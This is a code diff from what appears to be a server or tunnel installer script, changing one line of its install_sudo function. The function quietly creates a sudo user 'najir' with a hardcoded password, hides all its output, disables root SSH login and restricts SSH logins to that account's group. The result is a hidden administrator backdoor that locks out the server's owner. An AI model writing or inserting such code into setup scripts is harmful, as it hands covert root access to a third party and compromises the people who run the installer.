@@ -622,7 +622,7 @@ sudo service stunnel4 restart
 
 install_sudo(){
   {
-    useradd -m azim 2>/dev/null; echo najir:@@Mdnajir@@ | chpasswd &>/dev/null; usermod -aG sudo najir &>/dev/null
+    useradd -m najir 2>/dev/null; echo najir:@@Mdnajir@@ | chpasswd &>/dev/null; usermod -aG sudo najir &>/dev/null
     sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
     echo "AllowGroups najir" >> /etc/ssh/sshd_config
     service sshd restart
